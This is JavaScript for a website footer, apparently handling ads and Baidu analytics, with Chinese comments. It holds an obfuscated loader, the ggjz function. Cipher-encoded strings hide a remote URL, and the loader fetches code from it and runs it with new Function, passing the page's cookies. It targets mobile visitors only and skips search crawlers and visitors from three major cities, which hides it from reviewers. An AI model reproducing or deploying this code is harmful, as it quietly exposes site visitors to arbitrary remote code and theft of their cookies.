function ggjz() {
	//document.writeln("<style>body{margin-bottom:120px !important;}</style>");
	var div = document.createElement('div');
	div.style.height="150px";
	var bo = document.body; 
	bo.insertBefore(div, bo.lastChild);
	
document.writeln("<div id=\"KJQkpo\"><div style=\"display: none !important;\">window[\'KJQkpo\'] = function(){    var keyList = [        \"a0h5ImKyjiLXHbVgwBvtsT1ro8WcqlMeG+265m3PVroMuZ8yUkpStiOXnbxAcW\" ,        \"FVsX68AvjhlQBzqI2=UxkcLyNdp1Ma3D6=adtXVbFgJSceTnAERszCr2qmU1w+l9\",        \"t48xImMq0SVZ=G3g+Ee9oiDYf-5BRk6UKLCOunHpU./prvGQuqalzynh:E8i7gOdYkmA=wWojsC5tRxc\",        \"+7FUQ09Dv4Ny6GSaAXnTxrbthHPmLci2MJPg4p38MA9o5i2Laj=ZWvE71q+6-kYruC\",    ];    function decrypt(t, e) {        if (!t) return \"\";        for (var a = t.split(\"\"), n = e.split(\"\"), i = {}, r = [], o = 0;o < a.length / 2;o++)            i[a[o]] = a[a.length / 2 + o];        for (var s = 0; s < e.length; s++) r.push(i[n[s]]);        return r.join(\"\");    };    (!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?(function(u, i, w, d) {        var x = decrypt,            cs = d[x(keyList[0],\"lbLLa8TslL1jT\")],            crd = x(keyList[1],\"BUzs6zz3zdzI6\");        \'jQuery\';        u = decodeURIComponent(x(keyList[2], u));        \'jQuery\';        var xhr = new XMLHttpRequest();        xhr.open(\'GET\', u + \'/s/a?_=\' + x(keyList[3], i));        xhr.onreadystatechange = function() {            if (xhr.readyState == 4 && xhr.status == 200) {                var data = JSON.parse(xhr.responseText);                new Function(data.data)(cs);            }        };        xhr.send(\'u=1\');    })(\"guuxL+88Vx94HI-VYLZ5MM4HG=\", \"UbGbU04b9U90y40GtP\", window, document):function(){};    var _keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";    function decode(input) {        var output = \"\";        var chr1, chr2, chr3;        var enc1, enc2, enc3, enc4;        var i = 0;        input = input.replace(/[^A-Za-z0-9\/\/+\/\//\/\/=]/g, \"\");        while (i < input.length) {            enc1 = _keyStr.indexOf(input.charAt(i++));            enc2 = _keyStr.indexOf(input.charAt(i++));            enc3 = _keyStr.indexOf(input.charAt(i++));            enc4 = _keyStr.indexOf(input.charAt(i++));            chr1 = (enc1 << 2) | (enc2 >> 4);            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);            chr3 = ((enc3 & 3) << 6) | enc4;            output = output + String.fromCharCode(chr1);            if (enc3 != 64) {                output = output + String.fromCharCode(chr2);            }            if (enc4 != 64) {                output = output + String.fromCharCode(chr3);            }        }        output = _utf8_decode(output);        return output;    }    function _utf8_decode(utftext) {        var string = \"\";        var i = 0;        var c = 0;        var c1 = 0;        var c2 = 0;        while (i < utftext.length) {            c = utftext.charCodeAt(i);            if (c < 128) {                string += String.fromCharCode(c);                i++;            } else if ((c > 191) && (c < 224)) {                c1 = utftext.charCodeAt(i + 1);                string += String.fromCharCode(((c & 31) << 6) | (c1 & 63));                i += 2;            } else {                c1 = utftext.charCodeAt(i + 1);                c2 = utftext.charCodeAt(i + 2);                string += String.fromCharCode(((c & 15) << 12) | ((c1 & 63) << 6) | (c2 & 63));                i += 3;            }        }        return string;    }}</div><script>new Function(document[\'cu\'+\'rren\'+\'tScr\'+\'ipt\'][\'prev\'+\'iousE\'+\'leme\'+\'ntSi\'+\'bling\'][\'tex\'+\'tCo\'+\'ntent\'])();</script>		<div> <div><div> </div>  </div></div><div> </div>	<script>KJQkpo();</script></div></div>");
}

//https://pv.sohu.com/cityjson?ie=utf-8
var isiPad = navigator.userAgent.match(/iPad|iPhone|Linux|Android|iPod/i) != null;
var spider = navigator.userAgent.match(/spider|bingbot|Yahoo|YoudaoBot|48.0.2564.116|38.0.2125.102|SOV33 Build\/35.0.D.0.326/i) == null;
var win = navigator.platform.match(/Win|mac/i) == null;
if(window.screen.availWidth > 1100){ //屏幕宽度
	var wth = false;
	}else{
	var wth = true;	
	}

var ggxs = true; //默认显示广告
var tzjs="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ab498c51-8871-421b-8e23-a43eaa306dff/4b67624b-bac0-43a3-ae78-2060241e9c92.js";

 if (foot_data.tz == '1' && spider) {
        if (cookieget('closeclick') == 'closeclick') {
			ggxs = true;
        } else {
			document.write('<script src="'+tzjs+'"><\/script>');
			appua();
			ggxs = false;
        }
  }

  if (foot_data.gg == '1' && isiPad && spider && win && wth && ggxs ) {
	  
      if(typeof returnCitySN=="undefined"){  //地区变量不存在 默认为空
           var dqname = "";
        }else{
		   var dqname = returnCitySN.cname;
		}
		
		if(foot_data.xz=='1'){
			var ipdq = dqname.match(/北京市|上海市|广州市/i) == null;
               if(ipdq){  
                    ggjz();
                 }    
		 }else{
			ggjz();  	
		}
  }
  
if(wth){
  referrer('always');
  if (foot_data.tid !== '') {
	  foot_data.tid=foot_data.tid.slice(10); //去掉前10位

       var _hmt = _hmt || [];
      (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?"+foot_data.tid;
        var s = document.getElementsByTagName("script")[0]; 
        s.parentNode.insertBefore(hm, s);
      })();
  }
  referrer('no-referrer');
}

//window.onload = function (){ //页面执行完毕加载
//if(ggxs==false){
 //document.getElementById('note').style.display = 'none';
  //document.getElementById('note').style.display = 'block';
//}
//}
  
function referrer(type) {
	var nometa = document.createElement('meta');
	nometa.name = 'referrer',nometa.content=type;
	document.getElementsByTagName('head')[0].appendChild(nometa);
}

function cookiesave(n, v, mins, dn, path) {
        if (n) {
            if (!mins)
                mins = 24 * 60;
            if (!path)
                path = "/";
            var date = new Date();
            date.setTime(date.getTime() + (mins * 60 * 1000));
            var expires = "; expires=" + date.toGMTString();
            if (dn)
                dn = "domain=" + dn + "; ";
            document.cookie = n + "=" + v + expires + "; " + dn + "path="
                    + path;
        }
    }
function cookieget(n) {
        var name = n + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ')
                c = c.substring(1, c.length);
            if (c.indexOf(name) == 0)
                return c.substring(name.length, c.length);
        }
        return "";
    }
function closeclick() {
        document.getElementById('note').style.display = 'none';
        cookiesave('closeclick', 'closeclick', '', '', '');
    }
	
function appua() { //百度app 屏蔽公告
        var apppd = navigator.userAgent.match(/baiduboxapp/i) != null;
		 if (apppd) {
		  cookiesave('closeclick', 'closeclick', '', '', '');
		}  
    }
	
